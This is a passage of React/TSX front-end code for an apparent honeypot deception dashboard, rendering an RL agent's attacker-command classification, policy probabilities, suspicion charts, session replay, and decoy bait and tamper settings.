                    <div className="p-3 bg-slate-950/40 border border-[#064e3b] rounded-lg flex flex-col justify-between">
                      <div>
                        <span className="block text-[8.5px] uppercase tracking-wider text-emerald-600 font-bold mb-1 font-sans">1. True Command Intent</span>
                        <div className="text-emerald-200 font-extrabold text-xs flex items-center gap-1.5 leading-tight">
                          <Target className="w-3.5 h-3.5 text-[#10b981] shrink-0" />
                          <span>{activeTarget}</span>
                        </div>
                      </div>
                      <p className="text-[9px] text-[#059669] leading-snug font-sans mt-2">
                        Intercept maps input syntax directly to reverse-classify tactical honeypot actions.
                      </p>
                    </div>

                    {/* RL Classification Frame */}
                    <div className="p-3 bg-slate-950/40 border border-[#064e3b] rounded-lg flex flex-col justify-between">
                      <div>
                        <span className="block text-[8.5px] uppercase tracking-wider text-emerald-600 font-bold mb-1 font-sans">2. RL Agent's Classification</span>
                        <div className="text-purple-300 font-bold text-xs flex items-center gap-1.5 leading-tight">
                          <Sliders className="w-3.5 h-3.5 text-purple-400 shrink-0" />
                          <span className="uppercase break-words text-[11px]">
                            {activeTactic ? activeTactic : "KERNEL_ baseline"}
                          </span>
                        </div>
                      </div>
                      <div className="pt-1.5 flex justify-between items-center text-[9px] font-mono border-t border-emerald-950/40 mt-2">
                        <span className="text-slate-500 font-bold flex-1">DECISION INTERPRET:</span>
                        <span className="text-yellow-400 bg-emerald-950/20 px-1 py-0.2 rounded font-bold uppercase shrink-0 font-sans">
                          {mapActionName(activeActionIndex)}
                        </span>
                      </div>
                    </div>

                  </div>

                  {/* Brightly highlighted Deception Payload Block (User Target element) */}
                  <div className="mb-4">
                    <div className="text-[9px] text-emerald-600 uppercase tracking-wider font-bold mb-1 flex justify-between items-center font-sans">
                      <span>3. Injected Deception Payload</span>
                      <span className="text-yellow-500 font-bold text-[8px] uppercase tracking-widest px-1.5 py-0.5 rounded border border-[#1e293b] bg-[#0c100d] shrink-0 select-none">
                        Active Spoof Rule Committed
                      </span>
                    </div>

                    <div className="p-3.5 bg-gradient-to-br from-[#111827] to-[#020504] border-2 border-amber-600 rounded-lg shadow-[0_0_15px_rgba(245,158,11,0.12)] space-y-3 relative font-mono text-xs">
                      
                      {/* Interactive visual yellow rule tag */}
                      <div className="absolute top-0 left-0 bg-amber-500 h-[3px] w-full"></div>

                      <div className="space-y-2">
                        <div>
                          <span className="block text-[8.5px] uppercase tracking-wider text-amber-500 font-bold font-sans">Policy Mutate Objective:</span>
                          <p className="text-slate-200 block text-xs leading-normal italic bg-slate-950/90 p-2 rounded border border-emerald-950/50 font-sans mt-0.5 font-sans">
                            "{activeSpoofedInfo}"
                          </p>
                        </div>
                        
                        <div>
                          <span className="block text-[8.5px] uppercase tracking-wider text-amber-500 font-bold font-sans">Spoofed Stream Buffered back to Attacker TTY:</span>
                          <div className="bg-[#020508] p-2 rounded border border-amber-900/40 max-h-[140px] overflow-y-auto text-[10.5px] text-amber-300 leading-relaxed font-mono whitespace-pre-wrap select-all mt-0.5 scrollbar-thin scrollbar-thumb-amber-950">
                            {activeOverrideOut ? activeOverrideOut : "[Command returned empty success state (0) inside jail]"}
                          </div>
                        </div>
                      </div>
                    </div>
                  </div>

                  {/* Hacker Downstream Cognitive Perception loop feedback */}
                  <div className="p-3 bg-slate-950/60 border border-[#064e3b] rounded-lg text-xs leading-snug">
                    <span className="block text-[8.5px] text-emerald-600 uppercase tracking-wider font-bold mb-1 font-sans">4. Attacker Cognitive Response Loop</span>
                    <p className="text-emerald-400 italic font-sans text-xs">
                      “{activeAttackerRep}”
                    </p>
                  </div>

                </div>

                {/* Sub-Card Decoy Injection Rule Selection Toggles */}
                <div className="p-3 bg-[#0a110a] border border-[#0d2a17] rounded-xl space-y-3 shadow-inner">
                  <div className="flex items-center gap-1.5 text-emerald-400 font-bold border-b border-emerald-950/60 pb-1.5 uppercase tracking-wide">
                    <Sliders className="w-4 h-4 text-emerald-400 animate-pulse" />
                    <span>Real-Time Policy Overrides</span>
                  </div>

                  <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                    {/* Tamper policy selector */}
                    <div className="space-y-1">
                      <label className="text-[10px] text-emerald-500 font-bold block mb-1 uppercase tracking-wider font-sans">
                        File Download Tamper Policy
                      </label>
                      <div className="grid grid-cols-2 gap-1.5">
                        <button
                          onClick={() => setDownloadTamperMode("CORRUPT_EOF")}
                          className={`p-1.5 rounded text-[9px] font-mono border text-left transition-all cursor-pointer ${
                            downloadTamperMode === "CORRUPT_EOF"
                              ? "bg-yellow-950/60 border-yellow-500 text-yellow-300 font-bold font-sans"
                              : "bg-slate-950/85 border-emerald-950 text-emerald-600 hover:text-emerald-400 font-sans"
                          }`}
                        >
                          ⚡ EOF NULL PATCH
                        </button>
                        <button
                          onClick={() => setDownloadTamperMode("TRUNCATED_90")}
                          className={`p-1.5 rounded text-[9px] font-mono border text-left transition-all cursor-pointer ${
                            downloadTamperMode === "TRUNCATED_90"
                              ? "bg-rose-955/60 border-rose-500 text-rose-300 font-bold font-sans"
                              : "bg-slate-950/85 border-emerald-950 text-emerald-600 hover:text-emerald-400 font-sans"
                          }`}
                        >
                          🛑 90% SOCKET DROP
                        </button>
                        <button
                          onClick={() => setDownloadTamperMode("POISONED_HEADER")}
                          className={`p-1.5 rounded text-[9px] font-mono border text-left transition-all cursor-pointer ${
                            downloadTamperMode === "POISONED_HEADER"
                              ? "bg-purple-950/60 border-purple-500 text-purple-300 font-bold font-sans"
                              : "bg-slate-950/85 border-emerald-950 text-emerald-600 hover:text-emerald-400 font-sans"
                          }`}
                        >
                          🧬 HEADER TRACE
                        </button>
                        <button
                          onClick={() => setDownloadTamperMode("MOCK_SUCCESS")}
                          className={`p-1.5 rounded text-[9px] font-mono border text-left transition-all cursor-pointer ${
                            downloadTamperMode === "MOCK_SUCCESS"
                              ? "bg-[#064e3b]/60 border-emerald-500 text-emerald-300 font-bold font-sans"
                              : "bg-slate-950/85 border-emerald-950 text-emerald-600 hover:text-emerald-400 font-sans"
                          }`}
                        >
                          ✓ MOCK CLEAN OUT
                        </button>
                      </div>
                    </div>

                    {/* Bait schema policy selector */}
                    <div className="space-y-1">
                      <label className="text-[10px] text-emerald-500 font-bold block mb-1 uppercase tracking-wider font-sans">
                        Sensitive File bait mode
                      </label>
                      <div className="grid grid-cols-2 gap-1.5">
                        <button
                          onClick={() => setSensitiveFileSpoofMode("RANDOM_SHARES_INCONSISTENCY")}
                          className={`p-1.5 rounded text-[9px] font-mono border text-left transition-all cursor-pointer ${
                            sensitiveFileSpoofMode === "RANDOM_SHARES_INCONSISTENCY"
                              ? "bg-yellow-950/60 border-yellow-500 text-yellow-300 font-bold font-sans"
                              : "bg-slate-950/85 border-emerald-950 text-emerald-600 hover:text-emerald-400 font-sans"
                          }`}
                        >
                          ⚠️ UID/GID CONFLICT
                        </button>
                        <button
                          onClick={() => setSensitiveFileSpoofMode("SIMULATED_LOG_INTRUSION")}
                          className={`p-1.5 rounded text-[9px] font-mono border text-left transition-all cursor-pointer ${
                            sensitiveFileSpoofMode === "SIMULATED_LOG_INTRUSION"
                              ? "bg-rose-955/60 border-rose-500 text-rose-300 font-bold font-sans"
                              : "bg-slate-950/85 border-emerald-950 text-emerald-600 hover:text-emerald-400 font-sans"
                          }`}
                        >
                          ✏️ TYPO DECEPTION
                        </button>
                        <button
                          onClick={() => setSensitiveFileSpoofMode("EXPIRED_SSH_BAIT")}
                          className={`p-1.5 rounded text-[9px] font-mono border text-left transition-all cursor-pointer ${
                            sensitiveFileSpoofMode === "EXPIRED_SSH_BAIT"
                              ? "bg-purple-950/60 border-purple-500 text-purple-300 font-bold font-sans"
                              : "bg-slate-950/85 border-emerald-950 text-emerald-600 hover:text-emerald-400 font-sans"
                          }`}
                        >
                          🔑 EXPIRED KEY RING
                        </button>
                        <button
                          onClick={() => setSensitiveFileSpoofMode("CORRUPTED_SQL_DUMP")}
                          className={`p-1.5 rounded text-[9px] font-mono border text-left transition-all cursor-pointer ${
                            sensitiveFileSpoofMode === "CORRUPTED_SQL_DUMP"
                              ? "bg-rose-950/60 border-red-500 text-red-300 font-bold font-sans"
                              : "bg-slate-950/85 border-emerald-950 text-emerald-600 hover:text-emerald-400 font-sans"
                          }`}
                        >
                          💾 CORRUPT ARCHIVE
                        </button>
                      </div>
                    </div>
                  </div>
                </div>

                {/* Reality vs Illusion Sector Details Chart */}
                <div className="border border-emerald-950 rounded-lg overflow-hidden text-[10px] bg-slate-950 font-mono">
                  <div className="bg-[#030d07] p-2 font-bold uppercase text-[9px] tracking-wider text-emerald-400 border-b border-emerald-950 flex justify-between pr-3 select-none font-sans">
                    <span>Dimension Sector</span>
                    <span>Hacker TTY perception</span>
                    <span>Contained Sandbox reality</span>
                  </div>
                  
                  <div className="p-2 border-b border-emerald-950/50 bg-[#020504]/50 grid grid-cols-12 gap-1 items-center">
                    <div className="col-span-3 text-[#059669] font-semibold uppercase">IDENTITY</div>
                    <div className="col-span-4 text-emerald-400 font-bold bg-emerald-950/30 p-1 rounded border border-emerald-900 text-center text-[10px]">
                      root (UID 0)
                    </div>
                    <div className="col-span-1 text-center text-emerald-700">➔</div>
                    <div className="col-span-4 text-slate-400 bg-slate-950 p-1 rounded border border-slate-900 text-center font-bold text-[10px]">
                      Restricted low-priv jail
                    </div>
                  </div>

                  <div className="p-2 border-b border-emerald-950/50 bg-[#020504]/50 grid grid-cols-12 gap-1 items-center">
                    <div className="col-span-3 text-[#059669] font-semibold uppercase">MEMORY</div>
                    <div className="col-span-4 text-emerald-400 font-bold bg-emerald-950/30 p-1 rounded border border-emerald-900 text-center text-[10px]">
                      Full Machine Access
                    </div>
                    <div className="col-span-1 text-center text-emerald-700">➔</div>
                    <div className="col-span-4 text-slate-400 bg-slate-950 p-1 rounded border border-slate-900 text-center font-bold text-[10px]">
                      Isolated RAM Disk
                    </div>
                  </div>

                  <div className="p-2 bg-[#020504]/50 grid grid-cols-12 gap-1 items-center">
                    <div className="col-span-3 text-[#059669] font-semibold uppercase">C2 OUTBOUND</div>
                    <div className="col-span-4 text-emerald-400 font-bold bg-emerald-950/30 p-1 rounded border border-emerald-900 text-center text-[10px]">
                      SSH TCP Stream Open
                    </div>
                    <div className="col-span-1 text-center text-emerald-700">➔</div>
                    <div className="col-span-4 text-rose-450 bg-rose-950/10 p-1 rounded border border-rose-900/60 text-center font-bold text-[10px]">
                      Simulated Loopback (0x0)
                    </div>
                  </div>
                </div>

              </div>
            )}

            {/* TAB 2: REINFORCEMENT LEARNING LOGIC */}
            {activeDeceptionTab === 'pipeline' && (
              <div className="space-y-4 font-mono">
                
                <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                  
                  {/* Current State Vector Details list code */}
                  <div className="bg-[#020704] border border-[#065f46] rounded-xl p-4 flex flex-col justify-between">
                    <div>
                      <h2 className="text-xs uppercase text-[#10b981] font-semibold flex items-center gap-2 mb-3 tracking-wider font-sans">
                        <Activity className="w-4 h-4 text-[#10b981]" /> Contained State vectors (s_t)
                      </h2>
                      <p className="text-[10px] text-emerald-600 mb-3 -mt-1 font-sans">State tensors generated from historical shell session variables.</p>
                      
                      <div className="grid grid-cols-2 gap-2.5 font-mono text-xs">
                        <div className="p-2 bg-slate-950/50 border border-emerald-950 w-full rounded">
                          <span className="text-[9px] text-[#059669] block font-sans">NUM_COMMANDS</span>
                          <span className="text-md font-bold text-[#6ee7b7]">{rlState.num_commands}</span>
                        </div>
                        <div className="p-2 bg-slate-950/50 border border-emerald-950 w-full rounded">
                          <span className="text-[9px] text-[#059669] block font-sans">TIME_ALIVE</span>
                          <span className="text-md font-bold text-[#6ee7b7]">{rlState.time_alive}s</span>
                        </div>
                        <div className="p-2 bg-slate-950/50 border border-emerald-950 w-full rounded">
                          <span className="text-[9px] text-[#059669] block font-sans">UNIQUE_INPUTS</span>
                          <span className="text-[#34d399] font-bold">{rlState.unique_commands}</span>
                        </div>
                        <div className="p-2 bg-slate-950/50 border border-emerald-950 w-full rounded">
                          <span className="text-[9px] text-[#059669] block font-sans">REPETITIVE CHURN</span>
                          <span className={`font-bold ${rlState.repetitive > 0 ? 'text-rose-400' : 'text-[#34d399]'}`}>{rlState.repetitive}</span>
                        </div>
                        <div className="col-span-2 p-1.5 bg-black border border-emerald-950 rounded flex justify-between items-center text-[10px]">
                          <span className="text-[9px] text-emerald-700 uppercase font-bold font-sans">Threat Classifier</span>
                          <span className={`text-[9px] px-1.5 py-0.2 rounded font-bold uppercase border ${
                            rlState.command_type === 1 ? 'bg-purple-950/60 text-purple-400 border-purple-950' : 
                            rlState.command_type === 2 ? 'bg-rose-950/60 text-rose-450 border-rose-950' :
                            rlState.command_type === 3 ? 'bg-yellow-950/60 text-yellow-400 border-yellow-950' :
                            'bg-slate-900 border-slate-750 text-slate-400'
                          }`}>
                            {rlState.command_type === 1 ? 'RECON' : rlState.command_type === 2 ? 'MALWARE' : rlState.command_type === 3 ? 'SCANNER' : 'NORMAL'}
                          </span>
                        </div>
                      </div>
                    </div>
                  </div>

                  {/* Dynamic Suspicion score monitoring */}
                  <div className="bg-[#020704] border border-[#065f46] rounded-xl p-4 flex flex-col justify-between h-[200px] md:h-auto select-none">
                    <div>
                      <div className="flex justify-between items-center mb-1">
                        <h2 className="text-[9px] tracking-widest uppercase text-emerald-500 font-bold">Attacker suspicion trace</h2>
                        <span className={`text-xs font-bold px-2 py-0.5 rounded ${currentSqs > 80 ? 'text-rose-400 bg-rose-950/30' : currentSqs > 60 ? 'text-yellow-400 bg-yellow-950/30' : 'text-[#34d399] bg-emerald-950/30'}`}>
                          {currentSqs}% SQS
                        </span>
                      </div>
                      <p className="text-[9px] text-emerald-600 font-sans leading-normal">Session Quality Score monitors how likely the attacker is to exit the terminal.</p>
                    </div>

                    <div className="flex-1 min-h-[105px] w-full relative mt-2 mb-1">
                      <ResponsiveContainer width="100%" height="100%">
                        <AreaChart data={isReplaying && replaySession ? replaySession.sqsData.slice(0, replayCommandIndex + 1) : sqsHistory}>
                          <defs>
                            <linearGradient id="colorSqs" x1="0" y1="0" x2="0" y2="1">
                              <stop offset="5%" stopColor="#10b981" stopOpacity={0.25}/>
                              <stop offset="95%" stopColor="#10b981" stopOpacity={0}/>
                            </linearGradient>
                          </defs>
                          <CartesianGrid strokeDasharray="3 3" stroke="#052e16" vertical={false} />
                          <XAxis dataKey="time" hide />
                          <YAxis domain={[0, 100]} hide />
                          <Area 
                            type="monotone" 
                            dataKey="sqs" 
                            stroke="#10b981" 
                            strokeWidth={1.5}
                            fillOpacity={1} 
                            fill="url(#colorSqs)" 
                            isAnimationActive={false}
                          />
                        </AreaChart>
                      </ResponsiveContainer>
                    </div>
                  </div>

                </div>

                {/* Brain State decision probability metrics grid panel */}
                <div className="p-4 bg-[#020804] border border-emerald-950 rounded-xl space-y-4 shadow-2xl">
                  
                  <div className="flex items-center justify-between border-b border-emerald-950/60 pb-2 select-none">
                    <div className="flex items-center gap-1.5 font-bold text-xs uppercase text-emerald-400 font-sans">
                      <Cpu className="w-4 h-4 text-[#10b981]" />
                      <span>Neural Policy Matrix: final_model (PPO Controller)</span>
                    </div>

                    <div className="flex items-center gap-1.5 text-[10px]">
                      <span className={`w-1.5 h-1.5 rounded-full ${
                        backendStatus === 'online' ? 'bg-emerald-500 animate-ping' :
                        backendStatus === 'evaluating' ? 'bg-yellow-500 animate-pulse' : 'bg-slate-500'
                      }`}></span>
                      <span className="font-bold text-[8px] uppercase tracking-wider bg-[#041108]/90 text-emerald-400 px-1.5 py-0.5 rounded border border-emerald-900/60 font-sans">
                        {backendStatus === 'online' ? "ONLINE" : backendStatus === 'evaluating' ? "CALCULATING" : "INTEGRITY OK"}
                      </span>
                    </div>
                  </div>

                  {/* Normalized states display code banner */}
                  <div className="bg-black/80 p-2 rounded-md border border-emerald-950 text-[10px] font-mono leading-normal">
                    <span className="block text-[8px] text-[#059669] uppercase font-bold tracking-widest mb-1 select-none font-sans">State Layer Input Tensor [S_t]</span>
                    <div className="text-emerald-400 font-medium tracking-tight bg-slate-900 p-1.5 rounded border border-emerald-950 flex gap-2 font-mono text-[10.5px]">
                      <span>[</span>
                      {[
                        (rlState.num_commands / 30).toFixed(2),
                        (rlState.time_alive / 300).toFixed(2),
                        (rlState.unique_commands / 20).toFixed(2),
                        ((rlState.last_command % 100) / 100).toFixed(2),
                        rlState.repetitive > 0 ? "1.00" : "0.00",
                        rlState.command_type === 1 ? "0.33" : rlState.command_type === 2 ? "0.66" : rlState.command_type === 3 ? "1.00" : "0.00"
                      ].map((v, idx) => (
                        <span key={idx}>{v}{idx < 5 ? "," : ""}</span>
                      ))}
                      <span>]</span>
                    </div>
                  </div>

                  {/* Weighted softmax lines list component */}
                  <div className="space-y-2">
                    <span className="block text-[8px] text-[#059669] uppercase font-bold tracking-widest select-none font-sans">π_θ(a|s) Policy distribution probability maps</span>
                    
                    <div className="space-y-2 text-[10px] font-mono font-sans">
                      {[
                        { index: 0, name: "NORMAL_EXECUTION (Mirror Shell)", token: "NORMAL_EXECUTION" },
                        { index: 1, name: "LATENCY_INJECTION (Socket Tarpit)", token: "LATENCY_INJECTION" },
                        { index: 2, name: "FAKE_ERROR (Friction-trigger crash)", token: "FAKE_ERROR" },
                        { index: 3, name: "FAKE_SUCCESS (Virtual sandbox isolation)", token: "FAKE_SUCCESS" },
                        { index: 4, name: "ENV_MODIFICATION (BAIT asset projection)", token: "ENV_MODIFICATION" }
                      ].map((item) => {
                        let score = 0.05;
                        if (lastApiTrace?.decision?.probabilities) {
                          score = lastApiTrace.decision.probabilities[item.index];
                        } else {
                          if (rlState.command_type === 3 && item.index === 1) score = 0.72;
                          else if (rlState.command_type === 2 && item.index === 0) score = 0.65;
                          else if (rlState.command_type === 1 && item.index === 4) score = 0.81;
                          else if (rlState.command_type === 0 && item.index === 0) score = 0.92;
                          else score = 0.05;
                        }

                        const barWidth = `${Math.round(score * 100)}%`;
                        const isActiveAction = currentAction === item.index;

                        return (
                          <div key={item.index} className="space-y-0.5" id={`probability-row-${item.index}`}>
                            <div className="flex justify-between items-center text-[10.5px]">
                              <span className={`leading-none ${isActiveAction ? "text-emerald-300 font-bold" : "text-emerald-700 font-normal"}`}>
                                {isActiveAction ? "➔ ▩ " : "  ⬡ "} {item.name}
                              </span>
                              <span className={`font-bold ${isActiveAction ? "text-[#10b981]" : "text-emerald-900"}`}>
                                {(score * 100).toFixed(1)}%
                              </span>
                            </div>
                            <div className="h-1.5 w-full bg-[#020603] border border-emerald-950 rounded overflow-hidden">
                              <div 
                                style={{ width: barWidth }} 
                                className={`h-full rounded-full transition-all duration-300 ${isActiveAction ? "bg-[#10b981]" : "bg-emerald-950/30"}`} 
                              />
                            </div>
                          </div>
                        );
                      })}
                    </div>
                  </div>

                  {/* Math indices summary metrics indicators */}
                  <div className="grid grid-cols-2 gap-2 border-t border-emerald-950/60 pt-2.5 text-[9px] font-mono select-none">
                    <div className="p-1 px-2 bg-black/60 rounded border border-emerald-950 flex justify-between">
                      <span className="text-emerald-800 font-sans">STATE VALUE V(s)</span>
                      <span className="text-emerald-400 font-bold">
                        {lastApiTrace?.decision?.state_value !== undefined 
                          ? `${lastApiTrace.decision.state_value >= 0 ? "+" : ""}${lastApiTrace.decision.state_value.toFixed(4)}` 
                          : "+0.4728"}
                      </span>
                    </div>
                    <div className="p-1 px-2 bg-black/60 rounded border border-emerald-950 flex justify-between">
                      <span className="text-emerald-800 font-sans">ENTROPY H(π)</span>
                      <span className="text-emerald-400 font-bold">
                        {lastApiTrace?.decision?.entropy !== undefined 
                          ? `${lastApiTrace.decision.entropy.toFixed(4)}` 
                          : "0.9413"}
                      </span>
                    </div>
                  </div>

                </div>

              </div>
            )}

            {/* TAB 3: SESSION RECORD PLAYBACK */}
            {activeDeceptionTab === 'replay' && (
              <div className="space-y-3 font-mono">
                <div className="p-2.5 border border-emerald-950 bg-slate-950/40 rounded-lg text-[10.5px] leading-relaxed text-[#10b981] font-sans">
                  Compare live interactive sandbox threat trials with pre-recorded Advanced Persistent Threat (APT) logs captured in chroot memory.
                </div>

                <div className="space-y-2 max-h-[220px] overflow-y-auto pr-1">
                  {[
                    {
                      id: "SESS-LIVE-ACTIVE",
                      name: "Live Contained Session",
                      timestamp: liveSessionCommands.length > 0 ? "In progress" : "No manual inputs yet",
                      commands: liveSessionCommands,
                      sqsData: sqsHistory.map((h, i) => ({ time: i, sqs: h.sqs })),
                      isLive: true
                    },
                    ...pastSessions
                  ].map((sess) => {
                    const activePlay = isReplaying && replaySession?.id === sess.id;
                    const logCount = sess.commands.length;
                    
                    return (
                      <div 
                        key={sess.id} 
                        className={`p-2.5 border rounded flex flex-col gap-1 ${activePlay ? 'border-amber-500 bg-[#3a2007]' : 'border-emerald-950 bg-[#020504]'}`}
                      >
                        <div className="flex justify-between items-center text-xs">
                          <span className={`font-bold uppercase ${activePlay ? 'text-amber-400 animate-pulse' : 'text-slate-300'}`}>{sess.name}</span>
                          <span className="text-[9px] text-[#059669] font-bold">{sess.id}</span>
                        </div>
                        
                        <div className="flex justify-between text-[10px] text-zinc-550">
                          <span>Commands: <strong className="text-emerald-400">{logCount}</strong></span>
                          <span>{sess.timestamp}</span>
                        </div>

                        <div className="flex gap-2 justify-end mt-1 border-t border-emerald-950/30 pt-1">
                          {activePlay ? (
                            <button
                              onClick={() => {
                                setIsReplaying(false);
                                setReplaySession(null);
                              }}
                              className="bg-amber-900 border border-amber-500 text-amber-100 p-1 px-2.5 rounded text-[10px] cursor-pointer font-sans font-bold"
                            >
                              Stop
                            </button>
                          ) : (
                            <button
                              disabled={logCount === 0}
                              onClick={() => {
                                setIsReplaying(true);
                                setReplaySession(sess as any);
                                setReplayCommandIndex(0);
                                setReplayIsPaused(false);
                                setReplaySpeed(1);
                              }}
                              className={`p-1 px-2 text-[10px] border rounded font-bold cursor-pointer transition-colors font-sans ${
                                logCount === 0 
                                  ? 'bg-[#05140b] border-emerald-950/60 text-emerald-900 cursor-not-allowed' 
                                  : 'bg-[#0d1e13] border-[#0c4e20] text-[#10b981] hover:border-[#10b981]'
                              }`}
                            >
                              Play
                            </button>
                          )}
                        </div>
                      </div>
                    );
                  })}
                </div>

                {isReplaying && replaySession && (
                  <div className="bg-[#120a02] border border-amber-905 rounded p-3 text-xs space-y-2.5 select-none font-mono">
                    <div className="flex justify-between items-center text-amber-500 font-bold border-b border-amber-900 pb-1.5 font-sans uppercase">
                      <span>Replay Speed / Timeline Controllers</span>
                      <span className="text-[10px] font-mono font-bold">Command {replayCommandIndex} of {replaySession.commands.length}</span>
                    </div>

                    <div className="flex justify-between items-center text-[10px]">
                      <div className="flex gap-2">
                        <button 
                          onClick={() => {
                            setReplayCommandIndex(0);
                            setReplayTypingText("");
                          }}
                          className="bg-slate-950 p-1 px-2 border border-amber-900 text-amber-400 hover:text-white rounded font-sans font-bold"
                        >
                          Restart
                        </button>
                        <button 
                          onClick={() => setReplayIsPaused(!replayIsPaused)}
                          className="bg-slate-950 p-1 px-2 border border-amber-900 text-amber-400 font-bold hover:text-white rounded font-sans"
                        >
                          {replayIsPaused ? "Resume" : "Pause"}
                        </button>
                      </div>

                      <div className="flex border border-amber-900 rounded bg-[#020504] p-0.5 text-[9px] font-sans">
                        {[1, 2, 4].map(s => (
                          <button
                            key={s}
                            onClick={() => setReplaySpeed(s)}
                            className={`px-1 rounded-sm cursor-pointer ${replaySpeed === s ? 'bg-amber-500 text-slate-950 font-bold' : 'text-amber-505 hover:bg-amber-950/30'}`}
                          >
                            {s}x
                          </button>
                        ))}
                      </div>
                    </div>
                  </div>
                )}

              </div>
            )}

            {/* TAB 4: FORENSIC AUDIT TABLE LEDGER DATABASE */}
            {activeDeceptionTab === 'feed' && (
              <div className="space-y-3 font-mono">
                
                <div className="flex flex-col sm:flex-row gap-2 items-stretch sm:items-center justify-between bg-slate-900 p-2 border border-emerald-950 rounded-lg text-xs font-sans">
                  <div className="relative flex-1">
                    <span className="absolute left-2.5 top-1/2 -translate-y-1/2 text-emerald-700">
                      <Search className="w-3 h-3" />
                    </span>
                    <input 
                      type="text"
                      value={logSearch}
                      onChange={(e) => setLogSearch(e.target.value)}
                      placeholder="Filter interactive indices..."
                      className="w-full bg-slate-950 border border-[#064e3b] text-[#34d399] pl-7 pr-2 py-1.5 rounded outline-none placeholder-emerald-950 font-mono text-[10.5px]"
                    />
                  </div>

                  <select
                    value={selectedTactic}
                    onChange={(e) => setSelectedTactic(e.target.value)}
                    className="bg-slate-950 border border-[#064e3b] text-[#34d399] px-2 py-1.5 rounded outline-none font-sans text-[10px] cursor-pointer"
                  >
                    <option value="ALL">ALL TACTICS</option>
                    {availableTactics.map(tacticItem => (
                      <option key={tacticItem} value={tacticItem}>{tacticItem}</option>
                    ))}
                  </select>

                  <button
                    onClick={() => setDeceptionEvents([])}
                    className="px-2 py-1 bg-red-950/40 border border-rose-950/40 text-rose-450 rounded hover:bg-rose-950/20 transition-colors text-[10px] font-bold"
                  >
                    Clear Feed
                  </button>
                </div>

                <div className="w-full overflow-x-auto rounded border border-emerald-950 bg-[#020504]">
                  <table className="w-full text-left border-collapse font-mono text-[9.5px]">
                    <thead>
                      <tr className="bg-[#041108]/90 border-b border-emerald-950 text-[#34d399] font-bold text-[9px] uppercase tracking-wider pl-1 font-mono select-none">
                        <th className="p-2 w-[70px]">TIME</th>
                        <th className="p-2">COMMAND</th>
                        <th className="p-2 w-[120px]">CLASSIFIED STATE</th>
                        <th className="p-2">FALSE DATA SERVED</th>
                      </tr>
                    </thead>
                    <tbody>
                      {processedEvents.length > 0 ? (
                        processedEvents.map((evt, idx) => {
                          let labelStyle = "bg-slate-900 text-slate-400 border border-slate-700";
                          if (evt.tactic.includes("LATENCY") || evt.tactic.includes("SPOOF")) {
                             labelStyle = "bg-yellow-950/25 border-yellow-800 text-yellow-400";
                          } else if (evt.tactic.includes("JAIL") || evt.tactic.includes("SANDBOX")) {
                            labelStyle = "bg-rose-950/25 border-rose-800 text-rose-400";
                          } else if (evt.tactic.includes("HONEYTOKEN")) {
                            labelStyle = "bg-purple-950/25 border-purple-800 text-purple-400";
                          }

                          return (
                            <tr key={evt.id} className={`border-b border-emerald-950/30 last:border-0 hover:bg-[#021f0a]/10 ${idx % 2 === 1 ? 'bg-[#020504]/30' : 'bg-transparent'}`}>
                              <td className="p-2 text-[#059669] shrink-0 font-bold whitespace-nowrap">{evt.timestamp}</td>
                              <td className="p-2 text-sky-400 font-extrabold truncate max-w-[100px]" title={evt.cmd}>{evt.cmd}</td>
                              <td className="p-2">
                                <span className={`px-1 rounded text-[8.5px] font-semibold ${labelStyle}`}>{evt.tactic}</span>
                              </td>
                              <td className="p-2 text-slate-300 italic truncate max-w-[160px]" title={evt.spoofedInfo}>"{evt.spoofedInfo}"</td>
                            </tr>
                          );
                        })
                      ) : (
                        <tr>
                          <td colSpan={4} className="p-6 text-center text-emerald-800 font-sans text-xs">
                            No logs matches filters.
                          </td>
                        </tr>
                      )}
                    </tbody>
                  </table>
                </div>

              </div>
            )}

            {/* TAB 5: RL MODEL DIAGNOSTICS */}
            {activeDeceptionTab === 'diagnostics' && (
              <div className="space-y-4 animate-fade-in">
                <RLModelDiagnostics />
              </div>
            )}

            {/* TAB 6: GENERATIVE DECOY ENGINE */}
            {activeDeceptionTab === 'generative' && (
              <div className="space-y-4 animate-fade-in">
                <GenerativeDecoyEngine persona={systemPersona} setPersona={setSystemPersona} />
              </div>
            )}

            {/* TAB 7: THREAT INTELLIGENCE FEED */}
            {activeDeceptionTab === 'threatIntel' && (
              <div className="space-y-4 animate-fade-in">
                <ThreatIntelFeed systemPersona={systemPersona} setSystemPersona={setSystemPersona} />
              </div>
            )}

            {/* TAB 8: AI DECEPTION CONSULTING terminal */}
            {activeDeceptionTab === 'advisor' && (
              <div className="space-y-4 animate-fade-in font-sans">
                <AIDeceptionConsultant systemPersona={systemPersona} setSystemPersona={setSystemPersona} />
              </div>
            )}

          </div>

          {/* Bottom sector sandbox status bar display */}
          <div className="mt-4 p-3 bg-[#070b09] rounded-xl border border-emerald-900/50 space-y-2 shrink-0 select-none">
            <div className="flex justify-between items-center text-[10px] font-sans">
              <span className="font-bold text-[#34d399] uppercase tracking-wider flex items-center gap-1.5">
                <Shield className="w-3.5 h-3.5 text-emerald-400 animate-pulse" />
                Hypervisor Sandbox isolation telemetry
              </span>
              <span className="font-mono text-[11px] text-[#10b981] font-bold">{sandboxContainment}% isolated</span>
            </div>
            
            <div className="w-full bg-[#020503] h-1.5 rounded-full p-[1px] border border-emerald-950 flex overflow-hidden">
              <motion.div 
                initial={{ width: 0 }}
                animate={{ width: `${sandboxContainment}%` }}
                className="bg-gradient-to-r from-emerald-600 to-teal-400 h-full rounded-full"
              />
            </div>

            <div className="flex justify-between text-[8px] text-emerald-700 mt-1 font-mono">
              <span>NAMESPACE DECOYS: CHROOT JAIL READY</span>
              <span>OUTBOUND IP PORT SOCKET: MOCK BLOCKED (0.0.0.0)</span>
            </div>
          </div>

        </div>

      </div>

      {/* Campaign configuration overrides selection */}
      <div className="mt-3 bg-[#020504] border border-[#0c4e22] rounded-xl p-3 flex flex-col sm:flex-row justify-between items-center text-[10px] text-emerald-600 font-mono text-center sm:text-left gap-2 sm:gap-0 shrink-0 font-mono">
        <div>
          ACTIVE CORRELATION ENG: <strong className="text-emerald-400 font-sans font-bold">PPO MODEL SYNCED (final_model)</strong>
        </div>
        <div>
          INTELLIGENCE THREAT MATRIX: <strong className="text-emerald-400 font-sans font-bold">ACTIVE [100.00% SYNC]</strong>
        </div>
      </div>
      
    </div>
  );
}
